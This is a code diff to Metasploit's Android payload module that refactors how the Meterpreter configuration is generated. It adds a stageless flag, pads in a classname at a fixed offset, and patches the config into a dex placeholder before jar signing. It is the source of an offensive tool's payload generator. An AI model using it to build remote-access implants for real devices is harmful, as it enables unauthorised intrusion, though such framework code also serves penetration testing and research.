@@ -51,18 +51,13 @@ module Msf::Payload::Android
       arch:       opts[:uuid].arch,
       expiration: ds['SessionExpirationTimeout'].to_i,
       uuid:       opts[:uuid],
-      transports: opts[:transport_config] || [transport_config(opts)]
+      transports: opts[:transport_config] || [transport_config(opts)],
+      stageless:  opts[:stageless] == true
     }
 
-    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
-    result = config.to_b
-
-    result[0] = "\x01" if opts[:stageless]
-    result
-  end
-
-  def string_sub(data, placeholder="", input="")
-    data.gsub!(placeholder, input + "\x00" * (placeholder.length - input.length))
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts).to_b
+    config[0] = "\x01" if opts[:stageless]
+    config
   end
 
   def sign_jar(jar)
@@ -98,14 +93,18 @@ module Msf::Payload::Android
   end
 
   def generate_jar(opts={})
+    config = generate_config(opts)
     if opts[:stageless]
       classes = MetasploitPayloads.read('android', 'meterpreter.dex')
+      # Add stageless classname at offset 8000
+      config += "\x00" * (8000 - config.size)
+      config += 'com.metasploit.meterpreter.AndroidMeterpreter'
     else
       classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
     end
 
-    config = generate_config(opts)
-    string_sub(classes, "\xde\xad\xba\xad" + "\x00" * 8191, config)
+    config += "\x00" * (8195 - config.size)
+    classes.gsub!("\xde\xad\xba\xad" + "\x00" * 8191, config)
 
     jar = Rex::Zip::Jar.new
     files = [
